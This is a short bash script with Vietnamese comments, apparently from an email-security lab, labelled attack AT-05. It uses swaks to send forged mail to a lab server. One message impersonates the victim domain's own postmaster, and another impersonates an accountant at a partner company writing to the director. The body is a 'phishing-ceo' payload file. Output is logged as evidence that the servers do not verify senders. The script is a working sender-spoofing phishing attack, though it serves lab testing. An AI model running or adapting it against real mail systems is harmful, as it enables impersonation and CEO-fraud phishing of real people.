#!/usr/bin/env bash
# AT-05  Mao danh chinh domain cua nan nhan (sender = domain cua ben nhan)
#   chay tren vm-atk:  sudo bash attacks/at05-spoof-own-domain.sh
# Thu den admin@congtyA.test nhung lai gia mao nguoi gui la postmaster@congtyB.test
# (domain cua ben GUI) - va nguoc lai, gia mao postmaster@congtyA.test gui cho
# chinh no, de chung minh ca HAI may thu deu tran deu khong kiem tra nguoi gui.
set -uo pipefail   # KHONG dung -e: 5xx/RCPT bi tu choi la KET QUA do duoc, khong phai loi script

SELF="$(readlink -f "$0")"; PROJECT="$(dirname "$(dirname "$SELF")")"
EVID=/root/evidence/atk; mkdir -p "$EVID"

run_one () {  # $1 ten buoc  $2 server  $3 envelope-from  $4 header-from  $5 to
  {
    echo "############### $1 ###############"
    echo "# swaks --server $2 --from $3 --to $5"
    swaks --server "$2" --port 25 \
          --from "$3" --to "$5" \
          --helo "mail.evidence.test" \
          --header "From: $4" \
          --header "Subject: [AT-05] $1" \
          --header "X-Lab-Mark: AT-05" \
          --body "@$PROJECT/attacks/payloads/phishing-ceo.txt" 2>&1
    echo
  }
}

{
  run_one "Gia mao postmaster@congtyA.test gui cho chinh admin@congtyA.test (qua mail1)" \
          mail1.congtyA.test 'postmaster@congtyA.test' 'IT Support <postmaster@congtyA.test>' 'admin@congtyA.test'
  run_one "Gia mao ketoan@congtyB.test (domain ben GUI) gui cho giamdoc@congtyA.test (qua mail1)" \
          mail1.congtyA.test 'ketoan@congtyB.test' 'Ke toan Beta <ketoan@congtyB.test>' 'giamdoc@congtyA.test'
} | tee "$EVID/at05-own-domain.log"

echo
echo
